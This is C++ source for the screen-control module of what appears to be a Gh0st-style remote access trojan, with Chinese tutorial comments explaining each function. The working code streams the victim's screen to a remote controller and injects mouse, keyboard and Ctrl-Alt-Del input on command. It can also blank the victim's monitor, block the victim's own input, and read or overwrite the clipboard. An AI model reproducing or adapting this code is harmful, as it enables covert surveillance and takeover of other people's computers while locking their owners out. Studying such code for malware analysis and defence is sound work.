#include "ScreenManager.h"



CScreenManager::CScreenManager(CClientSocket *pClient) :CManager(pClient)
{
	m_bAlgorithm = ALGORITHM_SCAN;            //屏幕扫描算法
	m_biBitCount = 8;
	m_pScreenSpy = new CScreenSpy(8);          //CScreenSpy类
	m_bIsWorking = true;
	m_bIsBlankScreen = false;
	m_bIsBlockInput = false;
	m_bIsCaptureLayer = false;
	//启动两个功能 看字义我们就知道ControlThread用于主控端对服务端的控制
	//我们由浅入深 先看一下ControlThread的功能转到这个函数

	//接着分析WorkThread函数
	m_hWorkThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread, this, 0, NULL, true);
	m_hBlankThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ControlThread, this, 0, NULL, true);
}


CScreenManager::~CScreenManager()
{
	m_bIsWorking = false;
	WaitForSingleObject(m_hWorkThread, INFINITE);
	WaitForSingleObject(m_hBlankThread, INFINITE);
}


DWORD  CScreenManager::ControlThread(LPVOID lparam)
{
	// TODO: 在此处添加实现代码.
	static	bool bIsScreenBlanked = false;
	CScreenManager *pThis = (CScreenManager *)lparam;
	while (pThis->IsConnect())
	{
		// 加快反应速度
		for (int i = 0; i < 100; i++)
		{
			if (pThis->IsConnect())
			{
				// 分辨率大小改变了
				if (pThis->IsMetricsChange())
					pThis->ResetScreen(pThis->GetCurrentPixelBits());
				Sleep(10);
			}
			else
				break;
		}
		if (pThis->m_bIsBlankScreen)
		{
			SystemParametersInfo(SPI_SETPOWEROFFACTIVE, 1, NULL, 0);
			SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM)2);
			bIsScreenBlanked = true;
		}
		else
		{
			if (bIsScreenBlanked)
			{
				SystemParametersInfo(SPI_SETPOWEROFFACTIVE, 0, NULL, 0);
				SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM)-1);
				bIsScreenBlanked = false;
			}
		}
		BlockInput(pThis->m_bIsBlockInput);

		// 分辨率大小改变了
		if (pThis->IsMetricsChange())
			pThis->ResetScreen(pThis->GetCurrentPixelBits());
	}

	BlockInput(false);

	//这个函数只是用于处理服务端黑屏的 我们返回构造函数
	return -1;
}


bool CScreenManager::IsConnect()
{
	// TODO: 在此处添加实现代码.
	return m_pClient->IsRunning();
}


bool CScreenManager::IsMetricsChange()
{
	// TODO: 在此处添加实现代码.
	LPBITMAPINFO	lpbmi = m_pScreenSpy->getBI();

	return (lpbmi->bmiHeader.biWidth != ::GetSystemMetrics(SM_CXSCREEN)) ||
		(lpbmi->bmiHeader.biHeight != ::GetSystemMetrics(SM_CYSCREEN));
}


void CScreenManager::ResetScreen(int biBitCount)
{
	// TODO: 在此处添加实现代码.
	m_bIsWorking = false;
	WaitForSingleObject(m_hWorkThread, INFINITE);
	CloseHandle(m_hWorkThread);

	delete m_pScreenSpy;

	if (biBitCount == 3)		// 4位灰度
		m_pScreenSpy = new CScreenSpy(4, true);
	else if (biBitCount == 7)	// 8位灰度
		m_pScreenSpy = new CScreenSpy(8, true);
	else
		m_pScreenSpy = new CScreenSpy(biBitCount);

	m_pScreenSpy->setAlgorithm(m_bAlgorithm);
	m_pScreenSpy->setCaptureLayer(m_bIsCaptureLayer);

	m_biBitCount = biBitCount;

	m_bIsWorking = true;
	m_hWorkThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread, this, 0, NULL, true);
}


int CScreenManager::GetCurrentPixelBits()
{
	// TODO: 在此处添加实现代码.
	return m_biBitCount;
}




DWORD  CScreenManager::WorkThread(LPVOID lparam)
{
	// TODO: 在此处添加实现代码.

	CScreenManager *pThis = (CScreenManager *)lparam;

	pThis->sendBITMAPINFO();         //发送bmp位图结构
	// 等控制端对话框打开

	pThis->WaitForDialogOpen();       //等待主控端的回应

	pThis->sendFirstScreen();         //发送第一帧的数据
	try // 控制端关闭时会出错
	{
		while (pThis->m_bIsWorking)
				pThis->sendNextScreen();      //然后继续发送接下来的数据
	}
	catch (...) {};

	//看上去这个函数也很简单，他的功能来自于sendBITMAPINFO,sendFirstScreen,sendNextScreen
	//我们要分析这三个函数就必须了解一个类CScreenSpy
	//查看sendBITMAPINFO函数的定义证明这一点
	return 0;
}


void CScreenManager::sendBITMAPINFO()
{
	// TODO: 在此处添加实现代码.
	//刚才给大家看过了m_pScreenSpy这个变量的定义就是CScreenSpy类
	//这里得到bmp结构的大小
	DWORD	dwBytesLength = 1 + m_pScreenSpy->getBISize();
	LPBYTE	lpBuffer = (LPBYTE)VirtualAlloc(NULL, dwBytesLength, MEM_COMMIT, PAGE_READWRITE);
	lpBuffer[0] = TOKEN_BITMAPINFO;
	//这里将bmp位图结构发送出去
	memcpy(lpBuffer + 1, m_pScreenSpy->getBI(), dwBytesLength - 1);
	Send(lpBuffer, dwBytesLength);
	VirtualFree(lpBuffer, 0, MEM_RELEASE);
}


void CScreenManager::sendFirstScreen()
{
	// TODO: 在此处添加实现代码.
	//这个函数也没有什么特别的就是从CScreenSpy的getFirstScreen函数中得到图像数据
	//然后用getFirstImageSize得到数据的大小然后发送出去，我们到getFirstScreen
	//的定义
	BOOL	bRet = false;
	LPVOID	lpFirstScreen = NULL;

	lpFirstScreen = m_pScreenSpy->getFirstScreen();
	if (lpFirstScreen == NULL)
		return;

	DWORD	dwBytesLength = 1 + m_pScreenSpy->getFirstImageSize();
	LPBYTE	lpBuffer = new BYTE[dwBytesLength];
	if (lpBuffer == NULL)
		return;

	lpBuffer[0] = TOKEN_FIRSTSCREEN;
	memcpy(lpBuffer + 1, lpFirstScreen, dwBytesLength - 1);

	Send(lpBuffer, dwBytesLength);
	delete[] lpBuffer;
}


void CScreenManager::sendNextScreen()
{
	//这个函数依旧很简洁 得到数据，得到数据大小，然后发送
	//我们到getNextScreen函数的定义 
	LPVOID	lpNetScreen = NULL;
	DWORD	dwBytes;
	lpNetScreen = m_pScreenSpy->getNextScreen(&dwBytes);

	if (dwBytes == 0 || !lpNetScreen)
		return;

	DWORD	dwBytesLength = 1 + dwBytes;
	LPBYTE	lpBuffer = new BYTE[dwBytesLength];
	if (!lpBuffer)
		return;

	lpBuffer[0] = TOKEN_NEXTSCREEN;
	memcpy(lpBuffer + 1, (const char *)lpNetScreen, dwBytes);


	Send(lpBuffer, dwBytesLength);

	delete[] lpBuffer;
}





void CScreenManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	try
	{
		switch (lpBuffer[0])
		{
		case COMMAND_NEXT:
			// 通知内核远程控制端对话框已打开，WaitForDialogOpen可以返回
			NotifyDialogIsOpen();
			break;
		case COMMAND_SCREEN_RESET:
			ResetScreen(*(LPBYTE)&lpBuffer[1]);
			break;
		case COMMAND_ALGORITHM_RESET:
			m_bAlgorithm = *(LPBYTE)&lpBuffer[1];
			m_pScreenSpy->setAlgorithm(m_bAlgorithm);
			break;
		case COMMAND_SCREEN_CTRL_ALT_DEL:
			::SimulateCtrlAltDel();
			break;
		case COMMAND_SCREEN_CONTROL:
		{
			// 远程仍然可以操作
			BlockInput(false);
			ProcessCommand(lpBuffer + 1, nSize - 1);
			BlockInput(m_bIsBlockInput);
		}
		break;
		case COMMAND_SCREEN_BLOCK_INPUT: //ControlThread里锁定
			m_bIsBlockInput = *(LPBYTE)&lpBuffer[1];
			break;
		case COMMAND_SCREEN_BLANK:
			m_bIsBlankScreen = *(LPBYTE)&lpBuffer[1];
			break;
		case COMMAND_SCREEN_CAPTURE_LAYER:
			m_bIsCaptureLayer = *(LPBYTE)&lpBuffer[1];
			m_pScreenSpy->setCaptureLayer(m_bIsCaptureLayer);
			break;
		case COMMAND_SCREEN_GET_CLIPBOARD:
			SendLocalClipboard();
			break;
		case COMMAND_SCREEN_SET_CLIPBOARD:
			UpdateLocalClipboard((char *)lpBuffer + 1, nSize - 1);
			break;
		case COMMAND_SCREEN_DISCONNECT:
			break;
		default:
			break;
		}
	}
	catch (...) {}
}

void CScreenManager::SendLocalClipboard()
{
	if (!::OpenClipboard(NULL))
		return;
	HGLOBAL hglb = GetClipboardData(CF_TEXT);
	if (hglb == NULL)
	{
		::CloseClipboard();
		return;
	}
	int	nPacketLen = GlobalSize(hglb) + 1;
	LPSTR lpstr = (LPSTR)GlobalLock(hglb);
	LPBYTE	lpData = new BYTE[nPacketLen];
	lpData[0] = TOKEN_CLIPBOARD_TEXT;
	memcpy(lpData + 1, lpstr, nPacketLen - 1);
	::GlobalUnlock(hglb);
	::CloseClipboard();
	Send(lpData, nPacketLen);
	delete[] lpData;
}

void CScreenManager::ProcessCommand(LPBYTE lpBuffer, UINT nSize)
{
	// 数据包不合法
	if (nSize % sizeof(MSG) != 0)
		return;

	SwitchInputDesktop();

	// 命令个数
	int	nCount = nSize / sizeof(MSG);

	// 处理多个命令
	for (int i = 0; i < nCount; i++)
	{
		MSG	*pMsg = (MSG *)(lpBuffer + i * sizeof(MSG));
		switch (pMsg->message)
		{
		case WM_LBUTTONDOWN:
		case WM_LBUTTONUP:
		case WM_RBUTTONDOWN:
		case WM_RBUTTONUP:
		case WM_MOUSEMOVE:
		case WM_LBUTTONDBLCLK:
		case WM_RBUTTONDBLCLK:
		case WM_MBUTTONDOWN:
		case WM_MBUTTONUP:
		{
			POINT point;
			point.x = LOWORD(pMsg->lParam);
			point.y = HIWORD(pMsg->lParam);
			SetCursorPos(point.x, point.y);
			SetCapture(WindowFromPoint(point));
		}
		break;
		default:
			break;
		}

		switch (pMsg->message)
		{
		case WM_LBUTTONDOWN:
			mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
			break;
		case WM_LBUTTONUP:
			mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
			break;
		case WM_RBUTTONDOWN:
			mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
			break;
		case WM_RBUTTONUP:
			mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
			break;
		case WM_LBUTTONDBLCLK:
			mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
			mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
			break;
		case WM_RBUTTONDBLCLK:
			mouse_event(MOUSEEVENTF_RIGHTDOWN | MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
			mouse_event(MOUSEEVENTF_RIGHTDOWN | MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
			break;
		case WM_MBUTTONDOWN:
			mouse_event(MOUSEEVENTF_MIDDLEDOWN, 0, 0, 0, 0);
			break;
		case WM_MBUTTONUP:
			mouse_event(MOUSEEVENTF_MIDDLEUP, 0, 0, 0, 0);
			break;
		case WM_MOUSEWHEEL:
			mouse_event(MOUSEEVENTF_WHEEL, 0, 0, GET_WHEEL_DELTA_WPARAM(pMsg->wParam), 0);
			break;
		case WM_KEYDOWN:
		case WM_SYSKEYDOWN:
			keybd_event(pMsg->wParam, MapVirtualKey(pMsg->wParam, 0), 0, 0);
			break;
		case WM_KEYUP:
		case WM_SYSKEYUP:
			keybd_event(pMsg->wParam, MapVirtualKey(pMsg->wParam, 0), KEYEVENTF_KEYUP, 0);
			break;
		default:
			break;
		}
	}
}

void CScreenManager::UpdateLocalClipboard(char *buf, int len)
{
	if (!::OpenClipboard(NULL))
		return;

	::EmptyClipboard();
	HGLOBAL hglbCopy = GlobalAlloc(GMEM_DDESHARE, len);
	if (hglbCopy != NULL) {
		// Lock the handle and copy the text to the buffer.  
		LPTSTR lptstrCopy = (LPTSTR)GlobalLock(hglbCopy);
		memcpy(lptstrCopy, buf, len);
		GlobalUnlock(hglbCopy);          // Place the handle on the clipboard.  
		SetClipboardData(CF_TEXT, hglbCopy);
		GlobalFree(hglbCopy);
	}
	CloseClipboard();
}
